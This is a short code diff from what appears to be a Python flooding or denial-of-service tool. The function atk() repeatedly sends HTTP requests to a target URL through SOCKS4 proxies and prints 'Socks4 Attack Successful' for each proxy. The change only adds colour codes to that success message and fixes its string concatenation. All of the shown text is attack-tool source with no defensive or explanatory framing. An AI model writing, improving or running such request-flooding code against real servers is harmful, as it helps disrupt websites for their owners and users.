@@ -210,7 +210,7 @@ def atk():
 				try:
 					for y in range(pwr):
 						s.get(url)
-						print("[+] Socks4 Attack Successful [ " str(proxy[0])+":"+str(proxy[1]) " ] ")
+						print("[+] Socks4 Attack Successful [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.BLUE + " ] " + Fore.WHITE)
 					s.close
 				except:
 					s.close()
